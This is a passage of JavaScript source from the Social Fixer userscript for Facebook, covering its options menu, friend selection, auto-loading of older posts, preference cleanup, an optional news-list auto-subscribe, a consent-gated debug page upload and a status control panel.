						}
					})();

					// ==================================================================
					// Once the CSS has been written, we can wait for DOMContentLoaded
					// for the rest of the functionality, so the document exists
					// ==================================================================
					var document_ready = function() {
						function toggle(o,default_open_option) {if (typeof o=="string") { o=$(o); }if (o && o.style) {var closed = (o.style.display=="none");o.style.display = closed?"":"none";if (default_open_option) {options.set(default_open_option,closed);}}}

						subscribe('page_transition',function() {log('[page_transition]');});

						function on_page_change(func) {
							subscribe('page_transition',function() {
								log("[arbiter]","page_transition");
								func();
							});
						}

						// ===================================================
						// "Select All" friends in events popup
						// ===================================================
						onSelectorLoad('.fbProfileBrowserListContainer',function(o) {
							if ($('sfx_select_all_friends')==null) {
								var dialog_content = parent(o,'.profileBrowserDialog,.dialog_content,.-cx-PRIVATE-uiDialog__content,.-cx-PRIVATE-uiDialog__body');
								var tbody = QS(dialog_content,'.filterBox tbody');
								var select_all = button('Select All',function() { 
									var i=0, all_links=[];
									var do_click = function() {
										if (all_links&&all_links.length>i) {
											clickLink(all_links[i++]);
											setTimeout(do_click,5);
										}
									};
									all_links=[];
									QSA(dialog_content,'.checkableListItem:not(.selectedCheckable) a.anchor',function(a) { 
										all_links.push(a);
									});
									if (all_links && all_links.length>0) {
										i=0;
										do_click(); 
									}
								},'sfx_select_all_friends','uiOverlayButton uiButton uiButtonLarge','Scroll user list to bottom to load all friends before clicking Select All!');
								insertBefore(select_all,QS(dialog_content,'label.uiButtonConfirm'));
							}
						});

						// ===================================================
						// Don't run in frames
						// ===================================================
						try {
							if (window.frameElement || unsafeWindow.frameElement) { return; }
							var tryagain = true;
							try {
								if (window && window.self && window.top) {
									if (window.self!=window.top) {
										return;
									}
									tryagain = false;
								}
							} catch(e) { }
							if (tryagain) {
								if (typeof unsafeWindow!="undefined" && (unsafeWindow!=unsafeWindow.top || unsafeWindow!=unsafeWindow.parent)) { 
									return;
								}
							}
						} catch(e) { return; }

						// ===================================================
						// More CSS that needed to wait until the document was 
						// ready and the HTML tag was available
						// ===================================================
						// Conditional options to add as CSS classes to the HTML tag
						var condition_options = [
							'hide_post_actions_until_hover',
							'hide_hovercard',
							'expand_nav_messages2',
							'expand_left_nav',
							'left_align',
							'static_left_col',
							'hide_update_email',
							'hide_notification_pictures',
							'hide_status_updater',
							'stretch_wide',
							'fix_comments',
							'fix_comment_cursor',
							'fix_comment_wrap',
							'hide_happening_now',
							'unlock_right_col',
							'chat_disable_sidebar',
							'chat_hide',
							'ticker_scroll',
							'lock_header',
							'timeline_hide_cover_photo',
							'timeline_hide_friends_box',
							'timeline_unzoom_images',
							'timeline_hide_maps',
							'timeline_single_column',
							'timeline_white_background',
							'expand_see_more',
							'highlight_sfx_news'];

						var classes = "";
						for (var i=0; i<condition_options.length; i++) {
							if (options.get(condition_options[i])) { classes+=condition_options[i]+" "; }
						}
						if (classes) { addClass(document.getElementsByTagName('html')[0],classes); }

						// Add theme classes
						var add_theme_classes = function() {
							var now = new Date();
							var html_tag = document.getElementsByTagName('html')[0];
							if (html_tag) {
								var html_classes = html_tag.className;
								html_classes = html_classes.replace(/bfb_theme_[^\s]+\s*/g,"");
								html_classes += " bfb_theme_year_"+(now.getFullYear())+" bfb_theme_month_"+(now.getMonth())+" bfb_theme_date_"+(now.getDate())+" bfb_theme_hour_"+(now.getHours())+" bfb_theme_minutes_"+(now.getMinutes())+" bfb_theme_seconds_"+(now.getSeconds())+" ";
								html_tag.className = html_classes;
							}
						}
						add_theme_classes();
						// Refresh the theme classes every minute
						setInterval(add_theme_classes,60000);

						if (document.body) {
							for (var i=0; i<10; i++) {
								append(document.body,el('div','bfb_theme_extra_div',{id:"bfb_theme_div_"+i}));
							}
						}
									
						// ==================================================================
						// Context-Sensitive Help
						// ==================================================================
						(function() {
							var bfb_help_popup = null;
							var bfb_help_popup_visible = false;
							document.addEventListener('click',function(e) {
								var o = target(e);
								if (hasClass(o,"bfb_help")) {
									if (!bfb_help_popup) {
										bfb_help_popup = el('div','bfb_helptext mini_x',{title:'Click to close Help'});
										document.body.appendChild(bfb_help_popup);
									}
									var helptext = QS(o,".bfb_helptext",'innerHTML');
									if (helptext) {
										html(bfb_help_popup,helptext);
										bfb_help_popup.style.visibility="hidden";
										show(bfb_help_popup);
										var x = (e.pageX-bfb_help_popup.offsetWidth);
										if (x<0) { x=e.pageX; }
										bfb_help_popup.style.left = x+'px';
										bfb_help_popup.style.top = (e.pageY+16)+'px';
										bfb_help_popup.style.visibility="visible";
										bfb_help_popup_visible = true;
										if (e.stopPropagation) { e.stopPropagation(); }
										if (e.preventDefault) { e.preventDefault(); }
									}
								}
								else if (bfb_help_popup_visible) {
									hide(bfb_help_popup);
									bfb_help_popup_visible = false;
								}
							},true);
						})();

						// ===================================================
						// Options button
						// ===================================================
						var add_option_item = function(){};
						var errors = [];
						onIdLoad('pageNav',function(nav) {
							if ($('bfb_options_button')==null) {
								var li = el('li',"navItem",{id:'bfb_options_button_li'});
								if (li.style && li.style.setProperty) {
									// Set hard-coded styles to position options wrench because the CSS is not inserted
									li.style.setProperty('position','relative','important');
									li.style.setProperty('z-index','4','important');
								}
								var a = el('a','fbJewel',{href:'#',title:'Social Fixer '+version+' Options',id:'bfb_options_button',rel:'toggle',role:'button'},null,'<img id="bfb_options_button_icon" src="'+wrench_23+'"><span id="bfb_badge_counter" class="jewelCount" style="display:none;"><span id="bfb_badge_count"></span></span>');
								append(li,a);
								var ul = el('ul',null,{id:'bfb_option_list'});
								append(li,ul);
								// Append menu options
								insertFirst(nav,li);

								badge_counter = document.getElementById('bfb_badge_count');
								render_badge_counter();
								add_option_item = function(o,title,func,section) {
									if (typeof o=="object") {
										if (section=="top" && document.getElementById('bfb_options_list_additional_options')!=null) {
											insertBefore(o,document.getElementById('bfb_options_list_additional_options'));
										}
										else if (section=="middle" && document.getElementById('bfb_options_list_last_divider')!=null) {
											insertBefore(o,document.getElementById('bfb_options_list_last_divider'));
										}
										else {
											append(document.getElementById('bfb_option_list'),o);
										}
									}
									else if (typeof o=="string" && typeof func=="function") {
										var li = el('li');
										if (title) {
											li.title = title;
										}
										var a = el('a',null,{href:'#'},{click:func},o);
										append(li,a);
										add_option_item(li,null,null,section);
									}
								}
								if (options.get('disabled')) {
									addClass(ul,'disabled');
									QS(document,'#bfb_options_button').style.opacity=.5;
									QS(document,'#bfb_options_button img').src="data:image/gif;base64,R0lGODlhFQAVAOYAAM5cXc5dXs5eX81eX81fYM1gYcxhY8tjZcpkaMlmasdsccZtc8ZudcVwd8RxecNye8Nze8J1fsJ2f8J3gcB8h8B9h798iL99iL2AjL2CjryEkryFk7uFlLmEk7qIl7qJmLqKmbqLmrmMnLiOn7eOn7aOn7ePoLeQobaPoLeQorWQorWSpLWUprSUp7SWqbSXqrOZrbOZrrOarrKar7Kbr7GcsbGdsq6guK2mvq2mv6ymvqypwqurxamsyKquyamvy6mwzKmwy6ixzaez0Ke00c9bW85dXf%2F%2F%2FwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEcALAAAAAAVABUAAAeVgEdFg4SFhoWCh4UNIjI2LRQFioYELkSXmBuThRaYRDwpDQKbhDOYGgakhQhBmBiqhROeOQGwgyWeRA6DBRUXkwA6uSsMIztELJMQucwRkzfMniqTHdGYNQOKGdFAlzgHihy5QzQSCkQ9CYoeuTELhCYPiiG5ILYouR%2B2J7kktkVCPK34V%2BQHphdGCB7x4QNGtn9HAgEAOw%3D%3D";
									add_option_item('Enable Social Fixer',null,function() { 
										options.set('disabled',false,true,function(){ 
											try { location.reload(true); } catch(e){} 
										});
									},'top');
									add_option_item = function(){};
								}
								else {
									html(ul,'<li id="bfb_options_list_additional_options" class="menuDivider"></li><li id="bfb_options_list_last_divider" class="menuDivider"></li>');
									// Add options link as first option
									add_option_item('Edit Social Fixer Options',null,function() { options.displayOptions(); hide_bfb_menu(); return false;  },'top');
									add_option_item(el('li','menuDivider'),null,null,'top');
									add_option_item('Support Group',null,function() { window.open('https://www.facebook.com/groups/412712822130938/'); hide_bfb_menu(); return false;  },'top');
									add_option_item('Known Issues / Bugs',null,function() { window.open('http://SocialFixer.com/bugs'); hide_bfb_menu(); return false;  },'top');
									add_option_item('Frequently Asked Questions',null,function() { window.open('http://SocialFixer.com/faq.php'); hide_bfb_menu(); return false;  },'top');
									add_option_item('About Social Fixer',null,function() { better_fb_options('tab_about'); hide_bfb_menu(); return false;  },'top');
									add_option_item('Donate To Support Development',null,function() { window.open('http://socialfixer.com/donate.php'); hide_bfb_menu(); return false;  },'top');
									add_option_item('Send Page Source (Debug)',null,function() { 
										hide_bfb_menu(); 
										var debug_form = QS(document,'bfb_debug_form');
										if (!debug_form) {
											debug_form = el('form',null,{id:'bfb_debug_form',method:'POST',action:'http://pastehtml.com/upload/create?input_type=html&result=address',target:'_blank'},null,'<input type="hidden" name="txt">');
											append( QS(document,'body'), debug_form );
										}
										var de = document.documentElement;
										QS(debug_form,'input').value = '<html id="'+de.id+'" class="'+de.className+'"><!-- SFX:'+version+' / Browser:'+unsafeWindow.navigator.userAgent+' -->'+de.innerHTML+'</html>';
										var msg = "Doing this will submit the content of the page you are viewing to a public server so that the author of Social Fixer can see your page to debug issues. You may want to choose Anonymize from the Options menu to make your page more private before submitting.\n\nA new window or tab will now open with a url. Paste that url into a post, comment, or email to share the full debug info!";
										if (protocol=="https:") {
											msg += "\n\n(NOTE: You may get a warning about an unencrypted connection. You can safely ignore this warning. Only the debug info below is being sent.)";
										}
										if (confirm(msg)) {
											debug_form.submit();
										}
										return false;  
									},'top');
									add_option_item('Clear cache',null,function() { ls.clear(); hide_bfb_menu(); return false;  },'top');
									
									// Add a "disable" option
									add_option_item('Disable Social Fixer','Turn this option on to DISABLE all Social Fixer\'s features temporarily.',function() { 
										hide_bfb_menu();
										if (confirm("Are you sure you want to disable all Social Fixer functionality?")) {
											alert("To enable Social Fixer again, click the red wrench icon that will appear in place of the normal icon");
											options.set('disabled',true,true,function(){ 
												try { location.reload(true); } catch(e){} 
											});
										}
									},'middle');
									// Add an error container
									error_container = el('div'); error_container.id = "bfb_error_list";
									var li = el('li');
									append(li,error_container);
									add_option_item( li );
									render_errors();
								}
								
								// Add a sticky note to highlight it
								if (!options.get('hide_options_indicator') && installed_since()<(2*days)) {
									var note = sticky_note($('bfb_options_button'),'left','Change Social Fixer options here!',null,null,{whiteSpace:'nowrap',padding:'0px 10px',minHeight:'20px',lineHeight:'20px'},null,(1*hours));
									click($('bfb_options_button'),function() {
										options.set('hide_options_indicator',true);
										removeChild(note);
									},false);
								}
							}
						});
						var hide_bfb_menu = function() {
							clickLink($('bfb_options_button'),true);
						}
					
						// some global option vars
						remote_content.typeahead_new.ttl=options.get('friend_tracker_interval')*3600;
						remote_content.friendslist.ttl=options.get('friend_tracker_interval')*3600;
						remote_content.friend_activity.ttl=options.get('friend_activity_interval')*3600;

						var hidden_elements_string = options.get('hidden_elements') || '';
						var hidden_elements_x_string = options.get('hidden_elements_x') || '';
						var hidden_elements = array_to_object(hidden_elements_string.split(','));
						var hidden_elements_x = array_to_object(hidden_elements_x_string.split(','));

						// EXIT if disabled!
						if (options.get('disabled')) { return; }
						
						// ===================================================
						// STICKY NOTES
						// ===================================================
						function sticky_note(o,position,content,pref,closefunc,opts,el_style,after) {
							var options_key = 'hide_sticky_'+pref;
							var opt;
							if (pref) {
								if (!options || options.get(options_key)) { return; }
								var is = installed_since();
								if (is==0) { return; }
								if (after && is()>after) { return; }
							}
							opts = opts || {};
							el_style = el_style || {};
							var prev_el_style = {};
							var c=el('div',"bfb_sticky_note bfb_sticky_note_"+position + ((opts.className)?" "+opts.className:"") );
							for (opt in opts) { if(opt!="className"){c.style[opt] = opts[opt]; } }
							for (opt in el_style) { 
								prev_el_style[opt] = o.style[opt];
								o.style[opt] = el_style[opt]; 
							}
							var inner_close_func = null;
							if (pref || closefunc) {
								inner_close_func = function() {
									if (pref) {
										options.set(options_key,true,true);
									}
									if (closefunc) {
										if (closefunc(c)===false) { return; }
									}
									removeChild(c);
									for (opt in prev_el_style) {
										o.style[opt] = prev_el_style[opt];
									}
								}
							}
							if (inner_close_func) {
								append(c, el('div','bfb_sticky_note_close',null,{'click':inner_close_func} ) );
							}
							if (typeof content=="string") {
								append(c,el('div',null,null,null,content));
							}
							else if (content && content.nodeName) {
								append(c,content);
								content.style.display="block";
							}
							append(c,el('div','bfb_sticky_note_arrow_border'));
							append(c,el('div','bfb_sticky_note_arrow'));

							var ps = current_style(o,'position');
							if (ps!="relative" && ps!="absolute" && ps!="fixed") {
								o.style.position="relative";
							}
							
							c.style.visibility="hidden";
							append(o,c);
							var height = c.offsetHeight;
							c.style.marginTop = -(height/2) + "px";
							c.style.visibility="visible";
							return c;
						}
						
						// ===================================================
						// Auto-click "Older Posts"
						// ===================================================
						var misfires=0;
						var olderPostsSelector = options.get('older_posts_selector');
						var maxOlderPostsClickCount = +options.get('auto_click_more_times') || 0;
						var maxmisfires= maxOlderPostsClickCount * 5;
						var older_posts_timeout = null;
						delayedFindAndClickOlderPosts = function(ms) {
							if (older_posts_timeout!=null) { clearTimeout(older_posts_timeout); }
							older_posts_timeout = setTimeout(findAndClickOlderPosts,ms);
						}		
						findAndClickOlderPosts = function() { 
							log("findAndClickOlderPosts",olderPostsClickCount,maxOlderPostsClickCount);
							clickOlderPosts(QS(document,olderPostsSelector));
						}
						if (maxOlderPostsClickCount>0) {
							onIdLoad('pagelet_stream_pager',function() { delayedFindAndClickOlderPosts(4000); });
							onIdLoad('profile_pager',function(){ 
								delayedFindAndClickOlderPosts(4000);
								log("[Older Posts]","profile_pager loaded");
							});
							on_page_change(function() {
								olderPostsClickCount = 0;
								misfires = 0;
							});
						}
						// Function to actually click Older Posts
						function clickOlderPosts(a) {
							var clicked = false;
							if (!options.get('auto_click_older_posts')) { return; }
							if (is_timeline()) { return; }
							try {
								if ( !unsafeWindow.JSCC || !unsafeWindow.AsyncRequest || (hasClass(document.getElementsByTagName("body")[0], 'home') && (!unsafeWindow.UIIntentionalStream || !unsafeWindow.UIIntentionalStream.instance || !unsafeWindow.UIPagelet )) ) {
									delayedFindAndClickOlderPosts(1000);
								}
								else if (!a) {
									// If the Older Posts link is not found at all, try again
									if (misfires++<maxmisfires) { delayedFindAndClickOlderPosts(1000); }
								}
								else if (olderPostsClickCount<maxOlderPostsClickCount) {
									var pager = getParentByClass(a,'uiMorePager');
									if (true) {
										if (pager && !QS(pager.parentNode,'.async_saving')) {
											try {
												if ( !(parent(a,'#profile_pager')) && unsafeWindow.UIIntentionalStream.instance && unsafeWindow.UIIntentionalStream.instance.loadOlderPosts) { 
													unsafeWindow.UIIntentionalStream.instance.loadOlderPosts(); 
													clicked = true;
													log("[Older Posts]","loadOlderPosts() called");
												}
												else if (a.onclick) {
													a.onclick();
													log("[Older Posts]","onclick() called");
													clicked = true;
												}
											} catch(e) { }
											if (!clicked) {
												clickLink(a,false);
												log("[Older Posts]","link clicked");
											}
											update_status('bfb_status_older',(++olderPostsClickCount));
											// Click again after a short delay
											delayedFindAndClickOlderPosts(2000);
										}
										else { if (misfires++<maxmisfires) { delayedFindAndClickOlderPosts(2000); } }
									}
									else {
										delayedFindAndClickOlderPosts(1000);
									}
								}
							} catch(e) { if (misfires++<maxmisfires) { delayedFindAndClickOlderPosts(2000); } }
						}

						// ==================================================================
						// MAKE USE OF FACEBOOK'S INTERNAL DATA! (if possible)
						// ==================================================================
						function $Env(key) { 
							if (typeof unsafeWindow!="undefined" && typeof unsafeWindow.Env!="undefined") { return unsafeWindow.Env[key]; }
							var val = QS(document,'input[name='+key+']','value');
							if (val) { return val; }
							return null;
						}

						// Set the install time of the script
						if (options.get('installed_on_5')==0) {
							options.set('installed_on_5',time(),false);
							options.save();
						}
						function installed_since() {
							var io = +options.get('installed_on_5');
							if (!io) { return 0; }
							return time()-io;
						}

						// ==================================================================
						// AUTO-SUBSCRIBE TO THE SOCIAL FIXER NEWS LIST
						// ==================================================================
						if (options.get('auto_subscribe_news') && !options.get('auto_subscribe_news_done')) {
							onSelectorLoad('#pinnedNav',function(o) {
								var subscribed = (!!QS(document,'#navItem_fl_10150970104052276'));
								var favorited = (!!QS(o,'#navItem_fl_10150970104052276'));
								var do_favorite = function() {
									var data = {
										'id':'fl_10150970104052276',
										'movetop':'true',
										'fb_dtsg':$Env('fb_dtsg'),
										'__user':userid
									};
									var encoded_data = encode_url_params(data);
									var url = 'https://www.facebook.com/ajax/bookmark/add/?__a=1';
									ajax({'method':'POST',headers:{'Content-type':'application/x-www-form-urlencoded','Connection':'close'},'url':url,'data':encoded_data,'onload':function(res) {
										options.set('auto_subscribe_news_done',true);
									}});
								};
								if (!subscribed || !favorited) {
									if (!subscribed) {
										var data = {
											'__a':1,
											'fb_dtsg':$Env('fb_dtsg'),
											'__user':userid
										};
										var encoded_data = encode_url_params(data);
										var url = 'https://www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=10150970104052276&__a=1';
										ajax({'method':'POST',headers:{'Content-type':'application/x-www-form-urlencoded','Connection':'close'},'url':url,'data':encoded_data,'onload':function(res) {
											if (res.status==200) {
												do_favorite();
											}
										}});
									}
									else if (!favorited) {
										do_favorite();
									}
								}
							});
						}

						// ==================================================================
						// CLEAN THE PREFS EVERY DAY!
						// ==================================================================
						clean_prefs = function() {
							var comment_expire_time = days * options.get('comment_expire_days'); 
							// Prune the old comment counts so the prefs don't get huge
							var t = time();
							var pruned_count = 0;
							var story_data = options.get('story_data');
							if (story_data) {
								for (var s in story_data) {
									var story = story_data[s];
									var cc = story.cc;
									if (cc && cc.t) {
										// First copy any new counts to the current counts
										if (cc.nt) { cc.t = cc.nt; delete cc['nt']; }
										if (cc.nc) { cc.c = cc.nc; delete cc['nc']; }
										// This is the new format
										if (t-cc.t > comment_expire_time) {
											delete story_data[s];
											pruned_count++;
										}
									}
									if (t-story.read > comment_expire_time) {
										delete story_data[s];
										pruned_count++;
									}
									// Get rid of junk cnc props
									if (typeof story['cnc']!="undefined") {
										delete story['cnc'];
									}
									// If there are no story properties, get rid of it
									var prop_count = 0;
									for (var p in story) { prop_count++; }
									if (!prop_count) {
										delete story_data[s];
									}
								}
								options.set('story_data',story_data,false);
								options.set('last_cleaned_on',time(),false);
								options.save();
							}
							return pruned_count;
						}
						var last_cleaned_on = +options.get('last_cleaned_on');
						if (!last_cleaned_on || (time()-options.get('last_cleaned_on') > 1000*60*60*24 )) {
							clean_prefs();
						}
						
						// ==================================================================
						// QUEUED LINK CLICKING
						// ==================================================================
						var clickLinkQueue = [];
						var clickLinkQueueTimer = null;
						var clickLinkQueueDelay = options.get('expand_similar_posts_delay') || 1000;
						function clickLinkQueued(el) {
							if (clickLinkQueueTimer==null || (!el && clickLinkQueue.length>0)) {
								if (!el) { el = clickLinkQueue.pop(); }
								el.style.backgroundColor="red";
								clickLink(el);
								clickLinkQueueTimer = setTimeout( function() { clickLinkQueued(); }, clickLinkQueueDelay);
							}
							else if (el) { clickLinkQueue.push(el); }
							else { clickLinkQueueTimer = null; }
						};

						// ==================================================================
						// Mark post as read after commenting
						// ==================================================================
						var commented_stories = {};
						if (options.get('mark_read_on_comment')) {
							var auto_mark_read = function(story) {
								if (story) {
									var fbid = story.getAttribute('fbid');
									if (fbid && story && hasClass(story,"bfb_processed")) {
										// Update the stored comment count +1
										var cc = story.getAttribute('comment_count');
										if (cc) {
											story.setAttribute('comment_count',(+cc)+1);
										}
										setTimeout(function(){
											mark_post_read(story,true);
										},10);
									}
								}
							}
							// Reliable method of detecting comments being added.
							// Doesn't seem to work when commenting on Pages as a Page
							subscribe('ufi/comment',function(a,form) {
								var story = parent(form.form,storySelector);
								auto_mark_read(story);
							});
							// Another method, for use on Pages
							var commentedPost = null;
							onSelectorLoad('.uiUfiUnseenItem',function(c) {
								var story = parent(c,storySelector);
								if (story && story==commentedPost) {
									auto_mark_read(story);
								}
								commentedPost = null;
							});
							subscribe('UserAction/new',function(a,b,c) {
								if (b && b.node && b.node.name=="comment") {
									var story = parent(b.node,storySelector);
									if (story) {
										commentedPost = story;
									}
								}
							});

						}
						
						// ===================================================
						// Handle DOM insertions
						// ===================================================
						var ignoreDomInsertedRegex = /(DOMControl_shadow|highlighterContent|uiContextualLayerPositioner|uiContextualDialogPositioner)/;
						var ignoreDomInsertedParentRegex = /(highlighter|fbChatOrderedList)/;
						var ignoreMutation = function(o) {
							var tn = o.tagName;
							if (o.nodeType==3 || internalUpdate) { return true; }
							if (tn=="SCRIPT" || tn=="LINK" || tn=="INPUT" || tn=="BR" || tn=="STYLE" || tn=="META") { return true; }
							var cn = o.className, pn=o.parentNode, pcn="";
							if (pn&&pn.className) {
								pcn = pn.className;
							}
							if (ignoreDomInsertedRegex.test(cn) || ignoreDomInsertedParentRegex.test(pcn)) { 
								return true; 
							}
							return false;
						}
						bind(document,"DOMNodeInserted", function (e) {
							var f,id,selector,el,els;
							var o = target(e);
							if (ignoreMutation(o)) { return; }
							
							if (options.get("fix_timestamps")) {
								fix_timestamps(o);
							}

							var processed = false;
							// If the insertion is a minifeedwall or something within a minifeedwall, check the option to make sure it should be processed
							var isMiniFeedWall = ((getParentByClass(o,"minifeedwall")!=null) || (getParentByClass(o,"fbProfileStream")!=null) || (o.getElementsByClassName('minifeedwall').length>0));
							var isGroupWall = ($('pagelet_group_mall')!=null);
							if ( ((!isMiniFeedWall && !is_timeline()) || processProfiles) && (!isGroupWall || processGroups) ) {
								// If it's a story itself, process it
								if ( matchesSelector(o,storySelector)) {
									processed = true;
									fixStory(o,isMiniFeedWall,isGroupWall);
								}
								// Otherwise, process any stories within it
								else if (o && o.querySelectorAll) {
									var stories = QSA(o,storySelector);
									if (stories && stories.length>0 && !QS(o,'.permalink_stream')) {
										processed = true;
										fixStories (stories , isMiniFeedWall, isGroupWall );
									}
								}
								if (processed) {
									elementLoad(o,domNodeInsertedStreamHandlers);
								}
							}
							if (!processed) {
								// Check for handling of queries
								elementLoad(o,domNodeInsertedHandlers);
							}
							

						});

						// ==================================================================
						// Kill the "Theater" photo viewer
						// ==================================================================
						if (options.get('disable_theater_view')) {
							var manipulatePhotoTheater = function() {
								if (unsafeWindow.PhotoTheater) { unsafeWindow.PhotoTheater = null; }
								setTimeout(manipulatePhotoTheater,1000);
							}
							manipulatePhotoTheater();
							unsafeWindow.addEventListener('click',function(e) {
								if (parent(target(e),'.fbProfileCoverDialog')) { return; }
								if (unsafeWindow.PhotoTheater) { unsafeWindow.PhotoTheater = null; }
								var a = parent(target(e),'a');
								if (a && (a.getAttribute('rel')=="theater" || hasClass(a,'uiMediaThumb') || hasClass(a,'uiPhotoThumb'))) {
									a.removeAttribute('rel');
									a.removeAttribute('ajaxify');
								}
							},true);
						}

						// ==================================================================
						// GENERAL POPUP DIALOG
						// ==================================================================
						function show_dialog(content,header,okfunc,okbutton_text,footer_content) {
							var dialog = el('div','bfb_dialog');
							var dialog_content = el('div','bfb_dialog_content');
							if (header) {
								append(dialog,el('div','bfb_dialog_header',null,null,header));
							}
							if (typeof content=="string") { html(dialog_content,content); }
							else { append(dialog_content,content); }
							append(dialog,dialog_content);
							var footer = el('div','bfb_dialog_footer');
							if (footer_content) {
								if (typeof footer_content=="string") { html(footer,footer_content); }
								else { append(footer,footer_content); }
							}
							else {
								append(footer,button( (okbutton_text?okbutton_text:'OK') ,function(e){ if(okfunc) { okfunc(e); } removeChild(dialog); },'better_fb_close'));
							}
							append(dialog,footer);
							append(document.body,dialog);
							return dialog;
						}

						// ==================================================================
						// CONTROL PANEL
						// ==================================================================
						function createControlPanel(beforeEl) {
							var reload = function() { window.location.reload(); };
							var markAllRead = function() {
								markRead(function() {
									if (options.get('reload_when_mark_all_read')) {
										reload();
									}
								});
							}
							if (!$('better_fb_cp')) {
								var cp = el('div','better_fb_cp',{id:'better_fb_cp'});

								// Add the version number
								append(cp,el('div','sfx_cp_version',null,null,version));

								// Add the more/less toggler
								var show_more = options.get('cp_show_more');
								append(cp,el('span','better_fb_cp_more_less '+(show_more?"better_fb_cp_more":""),null,{click:function(e) {
									show_more = !show_more;
									options.set('cp_show_more',show_more);
									var l=target(e);
									toggleClass(l,'better_fb_cp_more');
									html(l, show_more?"less &#9650;":"more &#x25BC;");
								}},show_more?"less &#9650;":"more &#x25BC;"));

								//append(cp, el('legend',null,null,null,'Social Fixer ver. '+version+' Control Panel ') );
								if (options.get('cp_button_mark_all_read')) { append(cp, button('Mark All Read',markAllRead,'better_fb_mark_read') ); }
								if (options.get('cp_button_show_hide_all')) { append(cp, button('Show Hidden Posts',toggle_show_all,'better_fb_show_hide_all') ); }
								if (options.get('cp_button_mute_all')) { append(cp, button('Mute All',mute_all,'better_fb_mute_all') ); }
								if (options.get('cp_button_reload')) { append(cp, button('Reload',reload,'better_fb_reload') ); }
								if (options.get('cp_button_undo')) { append(cp, button('Undo',undo,'') ); }

								add_hideable(cp,'Social Fixer Control Panel','display_control_panel',true,null,0,0);
								insertFirst( beforeEl.parentNode , cp);
								var sc = '<span class="bfb_status_processed" style="cursor:help;" title="The number of posts that have been delivered by Facebook and processed by Social Fixer">Processed:<span id="bfb_status_processed">0</span><span class="bfb_status_separator">|</span></span>';
								sc += '<span class="bfb_status_hidden" style="cursor:help;" title="The number of posts that have been hidden by a filter or because they are already read">Hidden:<span id="bfb_status_hidden">0</span><span class="bfb_status_separator">|</span></span>';
								sc += '<span class="bfb_status_filters_cb" style="cursor:help;" title="The number of posts that have matched a filter rule. Toggle the checkbox to quickly turn filters on or off"><input type="checkbox" id="bfb_status_filters_cb">Filtered:<span id="bfb_status_filtered">0</span><span class="bfb_status_separator">|</span></span>';
								sc += '<span class="bfb_status_tabbed" style="cursor:help;" title="The number of posts that have been moved to a tab by a filter rule">Tabbed:<span id="bfb_status_tabbed">0</span><span class="bfb_status_separator">|</span></span>';
								sc += '<span class="bfb_status_reordered" style="cursor:help;" title="The number of posts reordered to be chronological">Reordered:<span id="bfb_status_reordered">0</span><span class="bfb_status_separator">|</span></span>';
								sc += '<span class="bfb_status_duplicate" style="cursor:help;" title="The number of duplicate posts delivered by Facebook and detected and hidden by Social Fixer">Dupes:<span id="bfb_status_duplicate">0</span><span class="bfb_status_separator">|</span></span>';
								sc += '<span class="bfb_status_older" style="cursor:help;" title="The number of times Older Posts has been automatically clicked. Toggle the checkbox to quickly enable or disable this feature"><input type="checkbox" id="bfb_status_older_posts_cb">Older Posts:<span id="bfb_status_older">0</span>/<input style="font-size:inherit;padding:0px;width:15px;cursor:pointer;" onfocus="this.select()" id="bfb_status_older_posts_input" value="'+maxOlderPostsClickCount+'"></span>';
								append(cp, el('div',null,{id:'bfb_status'},null,sc));
								QS('#bfb_status_older_posts_cb',function(cb) {
									cb.checked = options.get('auto_click_older_posts');
								});
								bind($('bfb_status_older_posts_cb'),'click',function(e) {
									options.set('auto_click_older_posts',this.checked);
									if (this.checked) {
										// If turned on, then run clicking of older posts immediately
										findAndClickOlderPosts();
									}
								});
								bind($('bfb_status_older_posts_input'),'change',function(e) {
									var newval = +this.value || 0;
									var findnow = false;
									options.set('auto_click_more_times',newval);
									if (newval > maxOlderPostsClickCount) {
										findnow = true;
									}
									maxOlderPostsClickCount = newval;
									maxmisfires = maxOlderPostsClickCount * 25;
									if (findnow) {
										findAndClickOlderPosts();
									}
								});
								QS('#bfb_status_filters_cb',function(cb) {
									cb.checked = options.get('filters_enabled');
								});
								bind($('bfb_status_filters_cb'),'click',function(e) {
									options.set('filters_enabled',this.checked);
									alert("Refresh the page to view it with filters "+(this.checked?"enabled":"disabled"));
								});
								
								// What to do when the control panel is removed
								subscribe('page_transition',function() {
									// Reset counters
									nostycount = 0;
									storyCount = 0;
									count_processed = 0;
									count_hidden = 0;
									count_filtered = 0;
									count_tabbed = 0;
									count_reordered = 0;
									count_expanded = 0;
									count_duplicate = 0;
								});
								
								// Handle page scrolling to keep control panel at the top
								var manualOffset = +( options.get('floating_cp_offset') || 0);
								var originalTop = 0
								var originalWidth = 0;
								var offsetWidthSet = false;
								var blueBarHeight = 0;
								if (options.get('float_control_panel')) {
									document.addEventListener('scroll', function(e) {
										if (!cp) { return; }
										var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
										if (!originalTop) {
											originalTop = offset(cp).top;
											blueBarHeight = $('blueBar').offsetHeight;
											originalWidth = cp.style.offsetWidth;
										}
										if (scrollTop==0 || !originalTop) {
											removeClass(cp,'bfb_cp_float');
											originalTop = null;
										}
										if (scrollTop > originalTop) {
											addClass(cp,'bfb_cp_float');
											cp.style.top = ((scrollTop-originalTop)+manualOffset)+blueBarHeight+"px";
											if (!offsetWidthSet) {
												cp.style.offsetWidth = originalWidth+"px";
												offsetWidthSet = true;
											}
										}
										else {
											removeClass(cp,'bfb_cp_float');
											cp.style.top = cp.style.offsetWidth = "";
											offsetWidthSet = false;
										}
									},true);
								}

							}
						}
						var status_timeout = {};
						function update_status(id,val,prop) {
							var s = $(id);
							if (s) {
								if (status_timeout[id]) {
									clearTimeout(status_timeout[id]);
								}
								status_timeout[id] = setTimeout( function() { if (s) { s.style.color=''; } }, 2000 );
								if (prop) {
									s[prop] = val;
								}
								else {
									html(s,val);
								}
								s.style.color='red';
							}
						}

						// =================
						// TAB Functionality
						// =================
						var previous_tab_id = null;
						var home_tab="Home";
						var home_tab_id=getTabId(home_tab);
						function addTabControllerStyles(tab_id,container_class) {
